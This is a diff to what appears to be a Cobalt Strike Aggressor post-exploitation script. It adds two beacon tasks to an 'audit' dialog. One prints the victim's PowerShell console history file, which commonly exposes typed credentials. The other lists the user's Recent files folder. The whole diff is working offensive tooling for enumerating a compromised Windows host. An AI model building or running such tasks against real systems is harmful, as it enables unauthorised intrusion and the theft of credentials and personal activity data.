@@ -62,6 +62,16 @@ sub proxy{
     breg_query($bid, "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Internet Settings", "x64");
 }
 
+sub chistory{
+    btask($bid, "=====Cmd & Powershell history=====", "");
+    bshell($bid, "type %APPDATA%\\Microsoft\\Windows\\PowerShell\\PSReadLine\\ConsoleHost_history.txt");
+}
+
+sub recent{
+    btask($bid, "=====Recent=====", "");
+    bshell($bid, "dir %APPDATA%\\Microsoft\\Windows\\Recent");
+}
+
 sub domain{
     btask($bid, "=====Domain=====", "");
     btask($bid, "Part One", "");
@@ -144,6 +154,8 @@ sub audit{
             drow_checkbox($dialog, "hotfix", "Hotfix list", "");
             drow_checkbox($dialog, "firewall", "Firewall configuration information", "");
             drow_checkbox($dialog, "proxy", "System proxy configuration information", "");
+            drow_checkbox($dialog, "chistory", "Cmd & Powershell history", "");
+            drow_checkbox($dialog, "recent", "Recent history", "");
             drow_checkbox($dialog, "domain", "Domain informations", "");
             drow_file($dialog, "automatic", "Use automatic script: ");
             drow_text($dialog, "redirect", "Script output file[optional]: ");
